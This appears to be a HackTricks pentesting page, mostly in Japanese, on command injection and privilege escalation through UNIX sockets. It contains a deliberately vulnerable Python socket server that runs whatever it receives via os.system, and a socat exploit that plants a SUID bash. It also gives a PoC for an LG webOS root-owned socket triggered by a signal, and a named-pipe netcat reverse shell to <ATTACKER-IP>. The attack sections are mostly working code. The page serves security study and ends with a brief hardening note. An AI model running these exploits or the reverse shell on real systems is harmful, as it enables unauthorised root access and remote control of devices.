# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## PythonでのSocket bindingの例

次の例では**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべてのデータ**が`os.system`によって**実行**されます。このようなものを実環境で見つけることはないでしょうが、この例の目的は、unix socketを使用するコードがどのようなものか、そして最悪のケースを想定して入力を処理する方法を確認することです。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**コードを実行**します: `python s.py`、そして**ソケットがどのようにリッスンしているかを確認**します:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Case study: root-owned UNIX socket signal-triggered escalation (LG webOS)

一部の特権 daemon は、信頼できない input を受け付け、特権 actions を thread-ID および signal と結び付ける root-owned UNIX socket を公開しています。protocol によって、unprivileged client が対象となる native thread を指定できる場合、特権 code path を trigger して escalation できる可能性があります。<sup>[[1]](#references)[[2]](#references)</sup>

主な write-up と disclosure では、以下の sequence について説明しています。<sup>[[1]](#references)[[2]](#references)</sup>

Observed pattern:
- root-owned socket（例: /tmp/remotelogger）に connect する。
- thread を作成し、その native thread id（TID）を取得する。
- TID（packed）と padding を request として送信し、acknowledgement を受信する。
- その TID に特定の signal を送信して、特権 behaviour を trigger する。

以下の簡略化した PoC は、この sequence を再現しています。<sup>[[1]](#references)[[2]](#references)</sup>
Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
これを root shell にするには、単純な named-pipe + nc パターンを使用できます。<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- このクラスのbugは、権限のないclient state（TIDs）から派生した値を信頼し、それらをprivilegedなsignal handlersまたはlogicに紐付けることで発生します。<sup>[[1]](#references)</sup>
- socket上でcredentialsを強制し、message formatsを検証し、privileged operationsを外部から提供されたthread identifiersから切り離すことでhardeningします。

## References

- [1] [楽しみのためのwebOS Jailbreak（ただの遊び）](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV Path Traversal、Authentication Bypass and Full Device Takeover（SSD Disclosure）](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
